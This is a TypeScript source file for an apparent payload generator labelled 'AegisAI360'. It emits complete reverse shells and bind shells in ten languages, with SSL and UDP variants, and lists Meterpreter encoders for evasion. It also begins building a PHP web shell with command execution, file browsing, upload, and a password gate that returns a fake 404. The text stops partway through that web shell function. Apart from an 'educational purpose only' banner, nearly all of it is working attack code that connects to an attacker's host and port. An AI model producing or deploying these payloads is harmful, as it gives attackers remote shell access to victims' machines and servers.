const EDUCATIONAL_DISCLAIMER = `# ============================================================
# EDUCATIONAL PURPOSE ONLY - AegisAI360 Payload Generator
# This payload is generated for authorized security testing,
# penetration testing training, and defensive research ONLY.
# Unauthorized use against systems you do not own or have
# explicit permission to test is ILLEGAL and UNETHICAL.
# ============================================================`;

const SUPPORTED_LANGUAGES = [
  "python", "bash", "powershell", "php", "ruby", "perl", "netcat", "java", "csharp", "go",
];

const WEBSHELL_LANGUAGES = ["php", "aspx", "jsp"];

const METERPRETER_PLATFORMS = ["windows", "linux", "android", "osx"];
const METERPRETER_ARCHS = ["x86", "x64", "arm"];
const METERPRETER_PAYLOAD_TYPES = ["reverse_tcp", "reverse_https", "bind_tcp"];
const METERPRETER_ENCODERS = [
  "x86/shikata_ga_nai",
  "x86/jmp_call_additive",
  "x86/call4_dword_xor",
  "x86/countdown",
  "x86/fnstenv_mov",
  "x64/xor",
  "x64/xor_dynamic",
  "cmd/powershell_base64",
  "php/base64",
  "ruby/base64",
];

export interface ReverseShellOptions {
  encrypted?: boolean;
  protocol?: "tcp" | "udp";
  staged?: boolean;
}

export interface WebShellOptions {
  fileManager?: boolean;
  commandExec?: boolean;
  upload?: boolean;
  authentication?: boolean;
  password?: string;
  obfuscation?: boolean;
}

export interface MeterpreterOptions {
  lhost: string;
  lport: number;
  encoder?: string;
  iterations?: number;
  format?: string;
  nops?: number;
}

export function getSupportedLanguages() {
  return {
    reverseShell: SUPPORTED_LANGUAGES,
    bindShell: SUPPORTED_LANGUAGES,
    webShell: WEBSHELL_LANGUAGES,
    meterpreter: {
      platforms: METERPRETER_PLATFORMS,
      architectures: METERPRETER_ARCHS,
      payloadTypes: METERPRETER_PAYLOAD_TYPES,
      encoders: METERPRETER_ENCODERS,
    },
    encodings: ["base64", "url", "hex", "unicode", "double", "powershell"],
  };
}

export function generateReverseShell(
  language: string,
  ip: string,
  port: number,
  options: ReverseShellOptions = {}
): { payload: string; language: string; type: string; size: number; notes: string } {
  const lang = language.toLowerCase();
  if (!SUPPORTED_LANGUAGES.includes(lang)) {
    throw new Error(`Unsupported language: ${language}. Supported: ${SUPPORTED_LANGUAGES.join(", ")}`);
  }

  let payload = "";
  let notes = "";
  const proto = options.protocol || "tcp";
  const encrypted = options.encrypted || false;

  switch (lang) {
    case "python":
      if (encrypted) {
        payload = `${EDUCATIONAL_DISCLAIMER}
# Python SSL Encrypted Reverse Shell
# Establishes an encrypted reverse connection to ${ip}:${port}
# The ssl.wrap_socket call encrypts all traffic between attacker and target
import socket,subprocess,os,ssl
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Wrap the socket with SSL for encrypted communications
ss=ssl.wrap_socket(s)
# Connect back to the listener at the specified IP and port
ss.connect(("${ip}",${port}))
# Redirect stdin/stdout/stderr to the socket
os.dup2(ss.fileno(),0)
os.dup2(ss.fileno(),1)
os.dup2(ss.fileno(),2)
# Spawn an interactive shell
subprocess.call(["/bin/sh","-i"])`;
        notes = "Requires Python 3. Uses SSL to encrypt the reverse shell traffic. The listener must accept SSL connections (e.g., ncat --ssl -lvp PORT).";
      } else if (proto === "udp") {
        payload = `${EDUCATIONAL_DISCLAIMER}
# Python UDP Reverse Shell
# Uses UDP protocol instead of TCP for the reverse connection
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
# Send initial UDP packet to establish communication
s.sendto(b"init",("${ip}",${port}))
# Receive commands via UDP, execute, and send results back
while True:
    data,addr=s.recvfrom(4096)
    # Execute the received command in a shell
    result=subprocess.run(data.decode(),shell=True,capture_output=True)
    # Send stdout and stderr back to the attacker
    s.sendto(result.stdout+result.stderr,addr)`;
        notes = "UDP-based reverse shell. Less reliable than TCP but may bypass some firewalls. Listener: nc -u -lvp PORT";
      } else {
        payload = `${EDUCATIONAL_DISCLAIMER}
# Python TCP Reverse Shell
# Creates a TCP socket and connects back to the attacker
import socket,subprocess,os
# Create a TCP socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Connect to the attacker's listener
s.connect(("${ip}",${port}))
# Duplicate file descriptors: redirect stdin(0), stdout(1), stderr(2) to the socket
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
# Spawn an interactive shell — all I/O goes through the socket
subprocess.call(["/bin/sh","-i"])`;
        notes = "Standard Python reverse shell. Requires Python 3 on target. Start listener with: nc -lvp PORT";
      }
      break;

    case "bash":
      if (proto === "udp") {
        payload = `${EDUCATIONAL_DISCLAIMER}
# Bash UDP Reverse Shell
# Uses /dev/udp pseudo-device for UDP communication
# Note: Requires Bash compiled with --enable-net-redirections
bash -i >& /dev/udp/${ip}/${port} 0>&1`;
        notes = "Requires Bash with network redirections compiled in. Not available on all systems.";
      } else {
        payload = `${EDUCATIONAL_DISCLAIMER}
# Bash TCP Reverse Shell
# Redirects bash I/O through a TCP connection using /dev/tcp
# /dev/tcp is a Bash built-in pseudo-device for TCP connections
bash -i >& /dev/tcp/${ip}/${port} 0>&1

# Alternative using exec (more reliable on some systems):
# exec 5<>/dev/tcp/${ip}/${port}; cat <&5 | while read line; do $line 2>&5 >&5; done

# Alternative using named pipe for systems where /dev/tcp is unavailable:
# rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${ip} ${port} > /tmp/f`;
        notes = "Requires Bash with /dev/tcp support. Alternatives provided for different system configurations. Listener: nc -lvp PORT";
      }
      break;

    case "powershell":
      if (encrypted) {
        payload = `${EDUCATIONAL_DISCLAIMER}
# PowerShell SSL Reverse Shell
# Establishes an encrypted TLS connection back to the attacker
# Uses .NET SslStream for encrypted communications
$client = New-Object System.Net.Sockets.TCPClient("${ip}",${port})
$stream = $client.GetStream()
# Wrap the TCP stream with SSL/TLS encryption
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient("${ip}")
[byte[]]$bytes = 0..65535|%{0}
# Read commands from the encrypted stream, execute, and send results back
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    # Execute the command and capture all output
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $sslStream.Write($sendbyte,0,$sendbyte.Length)
    $sslStream.Flush()
}
$client.Close()`;
        notes = "PowerShell SSL reverse shell. Encrypts all traffic. Listener needs SSL support (e.g., ncat --ssl -lvp PORT).";
      } else {
        payload = `${EDUCATIONAL_DISCLAIMER}
# PowerShell TCP Reverse Shell
# Uses .NET TCPClient to connect back to the attacker
# Creates a bidirectional command channel over TCP
$client = New-Object System.Net.Sockets.TCPClient("${ip}",${port})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
# Continuously read commands from the stream
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    # Convert bytes to string (the command to execute)
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    # Execute the command using Invoke-Expression and capture output
    $sendback = (iex $data 2>&1 | Out-String)
    # Append the current directory prompt for usability
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    # Send the output back through the stream
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()`;
        notes = "Standard PowerShell reverse shell. Works on Windows with PowerShell 2.0+. Listener: nc -lvp PORT";
      }
      break;

    case "php":
      payload = `${EDUCATIONAL_DISCLAIMER}
<?php
// PHP Reverse Shell
// Connects back to the attacker and spawns an interactive shell
// Uses fsockopen for TCP connection and proc_open for shell process

set_time_limit(0); // Remove execution time limit
$ip = "${ip}";
$port = ${port};

// Create a TCP socket connection to the attacker
$sock = fsockopen($ip, $port);
if (!$sock) { die("Connection failed"); }

// Create the process descriptors for stdin, stdout, stderr
$descriptorspec = array(
    0 => $sock,  // stdin reads from socket
    1 => $sock,  // stdout writes to socket
    2 => $sock   // stderr writes to socket
);

// Spawn /bin/sh with I/O redirected through the socket
$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
?>`;
      notes = "PHP reverse shell using fsockopen and proc_open. Requires these functions to not be in disable_functions. Listener: nc -lvp PORT";
      break;

    case "ruby":
      payload = `${EDUCATIONAL_DISCLAIMER}
# Ruby TCP Reverse Shell
# Uses Ruby's socket library to connect back and spawn a shell
require 'socket'

# Create a TCP connection to the attacker
f = TCPSocket.open("${ip}", ${port}).to_i

# Redirect stdin, stdout, stderr to the socket using exec
# The file descriptors 0,1,2 are remapped to the socket
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f, f, f)`;
      notes = "Ruby reverse shell. Requires Ruby installed on target. Listener: nc -lvp PORT";
      break;

    case "perl":
      payload = `${EDUCATIONAL_DISCLAIMER}
# Perl TCP Reverse Shell
# Uses IO::Socket to establish the connection
use Socket;
use FileHandle;

# Convert IP address and port to sockaddr_in structure
$p = ${port};
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(SOCKET, sockaddr_in($p, inet_aton("${ip}")));

# Redirect stdin/stdout/stderr to the socket
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");

# Spawn interactive shell with all I/O through the socket
exec("/bin/sh -i");`;
      notes = "Perl reverse shell. Perl is commonly available on Unix/Linux systems. Listener: nc -lvp PORT";
      break;

    case "netcat":
      payload = `${EDUCATIONAL_DISCLAIMER}
# Netcat Reverse Shell - Method 1: Using -e flag (traditional netcat)
# The -e flag executes /bin/sh and pipes I/O through the connection
nc -e /bin/sh ${ip} ${port}

# Method 2: Using named pipe (works with OpenBSD netcat which lacks -e)
# Creates a FIFO pipe to bridge netcat and the shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${ip} ${port} > /tmp/f

# Method 3: Using ncat with SSL encryption
# ncat provides built-in SSL support for encrypted shells
ncat --ssl -e /bin/sh ${ip} ${port}`;
      notes = "Multiple netcat variants provided. Method 1 requires traditional netcat with -e support. Method 2 works with OpenBSD netcat. Method 3 requires nmap's ncat. Listener: nc -lvp PORT";
      break;

    case "java":
      payload = `${EDUCATIONAL_DISCLAIMER}
// Java TCP Reverse Shell
// Creates a Runtime process to execute shell commands over a socket
import java.io.*;
import java.net.*;

public class ReverseShell {
    public static void main(String[] args) throws Exception {
        // Establish TCP connection to the attacker
        Socket s = new Socket("${ip}", ${port});

        // Get the input/output streams from the socket
        InputStream in = s.getInputStream();
        OutputStream out = s.getOutputStream();

        // Execute /bin/sh and redirect its I/O through the socket
        // Runtime.exec spawns the shell process
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-i"});

        // Create threads to pipe data between socket and process
        // Thread 1: Socket input -> Process stdin
        new Thread(() -> {
            try {
                byte[] buf = new byte[1024];
                int len;
                while ((len = in.read(buf)) != -1) {
                    p.getOutputStream().write(buf, 0, len);
                    p.getOutputStream().flush();
                }
            } catch (Exception e) {}
        }).start();

        // Thread 2: Process stdout -> Socket output
        new Thread(() -> {
            try {
                byte[] buf = new byte[1024];
                int len;
                while ((len = p.getInputStream().read(buf)) != -1) {
                    out.write(buf, 0, len);
                    out.flush();
                }
            } catch (Exception e) {}
        }).start();

        // Thread 3: Process stderr -> Socket output
        new Thread(() -> {
            try {
                byte[] buf = new byte[1024];
                int len;
                while ((len = p.getErrorStream().read(buf)) != -1) {
                    out.write(buf, 0, len);
                    out.flush();
                }
            } catch (Exception e) {}
        }).start();
    }
}`;
      notes = "Java reverse shell. Requires JRE on target. Compile: javac ReverseShell.java && java ReverseShell. Listener: nc -lvp PORT";
      break;

    case "csharp":
      payload = `${EDUCATIONAL_DISCLAIMER}
// C# TCP Reverse Shell
// Uses System.Net.Sockets for the TCP connection
// and System.Diagnostics.Process to spawn cmd.exe
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;

class ReverseShell {
    static void Main() {
        // Connect to the attacker's listener
        TcpClient client = new TcpClient("${ip}", ${port});
        NetworkStream stream = client.GetStream();

        // Start cmd.exe with redirected I/O
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.RedirectStandardInput = true;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        Process process = Process.Start(psi);
        StreamReader outputReader = process.StandardOutput;
        StreamReader errorReader = process.StandardError;
        StreamWriter inputWriter = process.StandardInput;

        // Read commands from socket and write to process stdin
        using (StreamReader sr = new StreamReader(stream)) {
            while (true) {
                // Send prompt
                byte[] prompt = System.Text.Encoding.ASCII.GetBytes("C:\\\\> ");
                stream.Write(prompt, 0, prompt.Length);

                string cmd = sr.ReadLine();
                if (cmd == null) break;

                inputWriter.WriteLine(cmd);
                inputWriter.Flush();

                System.Threading.Thread.Sleep(500);

                // Read and send output back
                while (outputReader.Peek() > -1) {
                    string output = outputReader.ReadLine() + "\\n";
                    byte[] outBytes = System.Text.Encoding.ASCII.GetBytes(output);
                    stream.Write(outBytes, 0, outBytes.Length);
                }
            }
        }
        process.Kill();
        client.Close();
    }
}`;
      notes = "C# reverse shell targeting Windows. Compile with: csc ReverseShell.cs. Spawns cmd.exe. Listener: nc -lvp PORT";
      break;

    case "go":
      payload = `${EDUCATIONAL_DISCLAIMER}
// Go TCP Reverse Shell
// Cross-platform reverse shell written in Go
// Compiles to a single static binary
package main

import (
    "net"
    "os/exec"
    "runtime"
)

func main() {
    // Connect back to the attacker
    conn, err := net.Dial("tcp", "${ip}:${port}")
    if err != nil {
        return
    }
    defer conn.Close()

    // Determine the shell based on the operating system
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        // Windows: use cmd.exe
        cmd = exec.Command("cmd.exe")
    } else {
        // Linux/macOS: use /bin/sh
        cmd = exec.Command("/bin/sh", "-i")
    }

    // Redirect all I/O to the network connection
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn

    // Run the shell — blocks until the shell exits
    cmd.Run()
}`;
      notes = "Go reverse shell. Cross-platform (Windows/Linux/macOS). Build: go build -o shell. Produces a single static binary. Listener: nc -lvp PORT";
      break;
  }

  return {
    payload,
    language: lang,
    type: `reverse_shell_${proto}${encrypted ? "_encrypted" : ""}`,
    size: Buffer.byteLength(payload, "utf-8"),
    notes,
  };
}

export function generateBindShell(
  language: string,
  port: number
): { payload: string; language: string; type: string; size: number; notes: string } {
  const lang = language.toLowerCase();
  if (!SUPPORTED_LANGUAGES.includes(lang)) {
    throw new Error(`Unsupported language: ${language}. Supported: ${SUPPORTED_LANGUAGES.join(", ")}`);
  }

  let payload = "";
  let notes = "";

  switch (lang) {
    case "python":
      payload = `${EDUCATIONAL_DISCLAIMER}
# Python Bind Shell
# Listens on the specified port and provides a shell to anyone who connects
import socket,subprocess,os,threading

def handle_client(conn):
    """Handle an incoming connection by spawning a shell"""
    # Redirect stdin/stdout/stderr to the connection
    os.dup2(conn.fileno(),0)
    os.dup2(conn.fileno(),1)
    os.dup2(conn.fileno(),2)
    subprocess.call(["/bin/sh","-i"])

# Create a TCP server socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Allow address reuse to avoid "address already in use" errors
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# Bind to all interfaces on the specified port
s.bind(("0.0.0.0",${port}))
# Listen for incoming connections (backlog of 1)
s.listen(1)
print(f"Listening on port ${port}...")
conn,addr=s.accept()
print(f"Connection from {addr}")
handle_client(conn)`;
      notes = "Python bind shell. Listens on port and provides shell access. Connect with: nc TARGET_IP PORT";
      break;

    case "bash":
      payload = `${EDUCATIONAL_DISCLAIMER}
# Bash Bind Shell using netcat
# Starts a listener that provides a shell to the first connection
# Method 1: Traditional netcat with -e flag
nc -lvp ${port} -e /bin/sh

# Method 2: Using named pipe (for OpenBSD netcat without -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvp ${port} > /tmp/f

# Method 3: Using socat (more features, encrypted option available)
socat TCP-LISTEN:${port},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane`;
      notes = "Bash bind shells using various tools. Method 1 needs traditional netcat. Method 3 uses socat for a full PTY. Connect with: nc TARGET_IP PORT";
      break;

    case "powershell":
      payload = `${EDUCATIONAL_DISCLAIMER}
# PowerShell Bind Shell
# Creates a TCP listener and provides PowerShell access to connecting clients
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, ${port})
# Start listening for incoming TCP connections
$listener.Start()
Write-Host "Listening on port ${port}..."

# Accept the first incoming connection
$client = $listener.AcceptTcpClient()
Write-Host "Client connected!"
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

# Send initial prompt
$prompt = "PS " + (pwd).Path + "> "
$sendbyte = ([text.encoding]::ASCII).GetBytes($prompt)
$stream.Write($sendbyte,0,$sendbyte.Length)
$stream.Flush()

# Command loop: read command, execute, send output
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    # Execute command and capture output including errors
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()`;
      notes = "PowerShell bind shell for Windows. Listens on the specified port. Connect with: nc TARGET_IP PORT";
      break;

    case "php":
      payload = `${EDUCATIONAL_DISCLAIMER}
<?php
// PHP Bind Shell
// Creates a TCP server that provides shell access
set_time_limit(0);
$port = ${port};

// Create and configure the server socket
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
// Bind to all interfaces
socket_bind($sock, "0.0.0.0", $port);
// Start listening
socket_listen($sock, 1);
echo "Listening on port $port...\\n";

// Accept incoming connection
$client = socket_accept($sock);
echo "Client connected!\\n";

// Spawn shell with I/O redirected to the client socket
$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);
$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);

// Read from client, write to shell stdin
// Read from shell stdout, write to client
while (true) {
    $read = array($client, $pipes[1], $pipes[2]);
    $write = null;
    $except = null;
    socket_select($read, $write, $except, null);
    
    if (in_array($client, $read)) {
        $input = socket_read($client, 1024);
        if ($input === false) break;
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read)) {
        $output = fread($pipes[1], 1024);
        socket_write($client, $output);
    }
    if (in_array($pipes[2], $read)) {
        $error = fread($pipes[2], 1024);
        socket_write($client, $error);
    }
}
proc_close($process);
socket_close($client);
socket_close($sock);
?>`;
      notes = "PHP bind shell using socket functions. Requires socket extension enabled. Connect with: nc TARGET_IP PORT";
      break;

    case "ruby":
      payload = `${EDUCATIONAL_DISCLAIMER}
# Ruby Bind Shell
# Listens on a port and provides shell access to connecting clients
require 'socket'

# Create a TCP server on all interfaces
server = TCPServer.new("0.0.0.0", ${port})
puts "Listening on port ${port}..."

# Accept one connection
client = server.accept
puts "Client connected!"

# Redirect stdin/stdout/stderr to the client socket and exec shell
f = client.to_i
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f, f, f)`;
      notes = "Ruby bind shell. Listens on specified port. Connect with: nc TARGET_IP PORT";
      break;

    case "perl":
      payload = `${EDUCATIONAL_DISCLAIMER}
# Perl Bind Shell
# Creates a TCP server socket and provides shell access
use Socket;

$port = ${port};
# Create, bind, and listen on a TCP socket
socket(SERVER, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, 1);
bind(SERVER, sockaddr_in($port, INADDR_ANY));
listen(SERVER, 1);
print "Listening on port $port...\\n";

# Accept a connection
accept(CLIENT, SERVER);
print "Client connected!\\n";

# Redirect I/O to the client socket
open(STDIN, "<&CLIENT");
open(STDOUT, ">&CLIENT");
open(STDERR, ">&CLIENT");

# Execute an interactive shell
exec("/bin/sh -i");`;
      notes = "Perl bind shell. Uses core Socket module. Connect with: nc TARGET_IP PORT";
      break;

    case "netcat":
      payload = `${EDUCATIONAL_DISCLAIMER}
# Netcat Bind Shell - Method 1: Traditional netcat
# Listens on port and executes /bin/sh for connecting clients
nc -lvp ${port} -e /bin/sh

# Method 2: OpenBSD netcat (no -e flag) using named pipe
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvp ${port} > /tmp/f

# Method 3: Using socat with full PTY
socat TCP-LISTEN:${port},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane

# Method 4: Using ncat (from nmap) with SSL encryption
ncat --ssl -lvp ${port} -e /bin/sh`;
      notes = "Various netcat bind shell methods. Method 4 provides SSL encryption. Connect with: nc TARGET_IP PORT (or ncat --ssl TARGET_IP PORT for method 4)";
      break;

    case "java":
      payload = `${EDUCATIONAL_DISCLAIMER}
// Java Bind Shell
// Listens on a TCP port and provides shell access
import java.io.*;
import java.net.*;

public class BindShell {
    public static void main(String[] args) throws Exception {
        // Create a server socket bound to the specified port
        ServerSocket server = new ServerSocket(${port});
        System.out.println("Listening on port ${port}...");

        // Accept incoming connection
        Socket client = server.accept();
        System.out.println("Client connected!");

        // Spawn a shell process
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-i"});

        // Pipe socket input to process stdin
        new Thread(() -> {
            try {
                byte[] buf = new byte[1024];
                int len;
                InputStream in = client.getInputStream();
                while ((len = in.read(buf)) != -1) {
                    p.getOutputStream().write(buf, 0, len);
                    p.getOutputStream().flush();
                }
            } catch (Exception e) {}
        }).start();

        // Pipe process stdout to socket output
        new Thread(() -> {
            try {
                byte[] buf = new byte[1024];
                int len;
                OutputStream out = client.getOutputStream();
                while ((len = p.getInputStream().read(buf)) != -1) {
                    out.write(buf, 0, len);
                    out.flush();
                }
            } catch (Exception e) {}
        }).start();

        // Pipe process stderr to socket output
        byte[] buf = new byte[1024];
        int len;
        while ((len = p.getErrorStream().read(buf)) != -1) {
            client.getOutputStream().write(buf, 0, len);
            client.getOutputStream().flush();
        }

        p.destroy();
        client.close();
        server.close();
    }
}`;
      notes = "Java bind shell. Compile with: javac BindShell.java && java BindShell. Connect with: nc TARGET_IP PORT";
      break;

    case "csharp":
      payload = `${EDUCATIONAL_DISCLAIMER}
// C# Bind Shell
// Listens on a TCP port and provides cmd.exe access
using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;

class BindShell {
    static void Main() {
        // Start TCP listener on all interfaces
        TcpListener listener = new TcpListener(IPAddress.Any, ${port});
        listener.Start();
        Console.WriteLine("Listening on port ${port}...");

        // Accept connection
        TcpClient client = listener.AcceptTcpClient();
        Console.WriteLine("Client connected!");
        NetworkStream stream = client.GetStream();

        // Start cmd.exe with redirected I/O
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.RedirectStandardInput = true;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        Process process = Process.Start(psi);

        // Read from socket, write to process
        byte[] bytes = new byte[65535];
        int i;
        while ((i = stream.Read(bytes, 0, bytes.Length)) != 0) {
            string data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
            string sendback = "";
            try {
                process.StandardInput.WriteLine(data);
                process.StandardInput.Flush();
                System.Threading.Thread.Sleep(500);
                while (process.StandardOutput.Peek() > -1) {
                    sendback += process.StandardOutput.ReadLine() + "\\n";
                }
            } catch (Exception e) {
                sendback = e.Message;
            }
            byte[] sendbyte = System.Text.Encoding.ASCII.GetBytes(sendback + "C:\\\\> ");
            stream.Write(sendbyte, 0, sendbyte.Length);
            stream.Flush();
        }
        process.Kill();
        client.Close();
        listener.Stop();
    }
}`;
      notes = "C# bind shell for Windows. Compile with: csc BindShell.cs. Connect with: nc TARGET_IP PORT";
      break;

    case "go":
      payload = `${EDUCATIONAL_DISCLAIMER}
// Go Bind Shell
// Listens on a TCP port and provides shell access
// Cross-platform: uses cmd.exe on Windows, /bin/sh on Unix
package main

import (
    "net"
    "os/exec"
    "runtime"
    "fmt"
)

func main() {
    // Listen on all interfaces at the specified port
    listener, err := net.Listen("tcp", "0.0.0.0:${port}")
    if err != nil {
        fmt.Println("Error:", err)
        return
    }
    defer listener.Close()
    fmt.Printf("Listening on port ${port}...\\n")

    // Accept one connection
    conn, err := listener.Accept()
    if err != nil {
        fmt.Println("Error:", err)
        return
    }
    defer conn.Close()
    fmt.Println("Client connected!")

    // Choose shell based on OS
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd.exe")
    } else {
        cmd = exec.Command("/bin/sh", "-i")
    }

    // Redirect all I/O to the network connection
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}`;
      notes = "Go bind shell. Cross-platform. Build: go build -o bindshell. Connect with: nc TARGET_IP PORT";
      break;
  }

  return {
    payload,
    language: lang,
    type: "bind_shell",
    size: Buffer.byteLength(payload, "utf-8"),
    notes,
  };
}

export function generateWebShell(
  language: string,
  options: WebShellOptions = {}
): { payload: string; language: string; type: string; size: number; notes: string } {
  const lang = language.toLowerCase();
  if (!WEBSHELL_LANGUAGES.includes(lang)) {
    throw new Error(`Unsupported web shell language: ${language}. Supported: ${WEBSHELL_LANGUAGES.join(", ")}`);
  }

  const commandExec = options.commandExec !== false;
  const fileManager = options.fileManager || false;
  const upload = options.upload || false;
  const useAuth = options.authentication || false;
  const password = options.password || "aegis360";
  const obfuscate = options.obfuscation || false;

  let payload = "";
  let notes = "";

  switch (lang) {
    case "php": {
      let authBlock = "";
      if (useAuth) {
        authBlock = `
// Authentication: Verify password before allowing access
$password_hash = '${Buffer.from(password).toString("base64")}'; // base64 of password
if (!isset($_POST['auth']) || base64_encode($_POST['auth']) !== $password_hash) {
    if (!isset($_GET['auth']) || base64_encode($_GET['auth']) !== $password_hash) {
        http_response_code(404);
        die('Not Found');
    }
}`;
      }

      let cmdBlock = "";
      if (commandExec) {
        cmdBlock = `
// Command Execution Module
// Provides a web interface to execute system commands
if (isset($_POST['cmd']) || isset($_GET['cmd'])) {
    $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : $_GET['cmd'];
    echo "<h3>Command Output:</h3>";
    echo "<pre>";
    // Try multiple execution functions in case some are disabled
    if (function_exists('system')) {
        system($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $output, $retval);
        echo implode("\\n", $output);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif (function_exists('passthru')) {
        passthru($cmd);
    } elseif (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = proc_open($cmd, $descriptorspec, $pipes);
        echo stream_get_contents($pipes[1]);
        echo stream_get_contents($pipes[2]);
        proc_close($process);
    } else {
        echo "No execution function available";
    }
    echo "</pre>";
}`;
      }

      let fileManagerBlock = "";
      if (fileManager) {
        fileManagerBlock = `
// File Manager Module
// Browse directories and view file contents
if (isset($_GET['dir']) || isset($_POST['dir'])) {
    $dir = isset($_POST['dir']) ? $_POST['dir'] : $_GET['dir'];
    if (!$dir) $dir = getcwd();
    echo "<h3>Directory: " . htmlspecialchars($dir) . "</h3>";
    echo "<table border='1' cellpadding='5'>";
    echo "<tr><th>Name</th><th>Type</th><th>Size</th><th>Permissions</th><th>Modified</th></tr>";
    if ($handle = opendir($dir)) {
        while (false !== ($entry = readdir($handle))) {
            $full = $dir . DIRECTORY_SEPARATOR . $entry;
            $type = is_dir($full) ? "DIR" : "FILE";
            $size = is_file($full) ? filesize($full) : "-";
            $perms = substr(sprintf('%o', fileperms($full)), -4);
            $mtime = date("Y-m-d H:i:s", filemtime($full));
            echo "<tr><td>" . htmlspecialchars($entry) . "</td><td>$type</td><td>$size</td><td>$perms</td><td>$mtime</td></tr>";
        }
        closedir($handle);
    }
    echo "</table>";
}

// File Read Module
if (isset($_GET['read'])) {
    $file = $_GET['read'];
    echo "<h3>File: " . htmlspecialchars($file) . "</h3>";
    echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
}`;
      }

      let uploadBlock = "";
      if (upload) {
        uploadBlock = `
// File Upload Module
// Allows uploading files to the server
if (isset($_FILES['upload'])) {
    $upload_dir = isset($_POST['upload_dir']) ? $_POST['upload_dir'] : getcwd();
    $target = $upload_dir . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
        echo "<p style='color:green'>File uploaded to: " . htmlspecialchars($target) . "</p>";
    } else {
        echo "<p style='color:red'>Upload failed</p>";
    }
}
echo '<h3>Upload File</h3>';
echo '<form method="POST" enctype="multipart/form-data">';
echo '<input type="file" name="upload" />';
echo '<input type="text" name="upload_dir" placeholder="Upload directory" value="' . getcwd() . '" />';
${useAuth ? `echo '<input type="hidden" name="auth" value="' . htmlspecialchars($_POST['auth'] ?? $_GET['auth'] ?? '') . '" />';` : ""}
echo '<input type="submit" value="Upload" />';
echo '</form>';`;
      }

      let body = `<?php
${EDUCATIONAL_DISCLAIMER.split("\n").map(l => "// " + l.replace(/^# ?/, "")).join("\n")}
${authBlock}

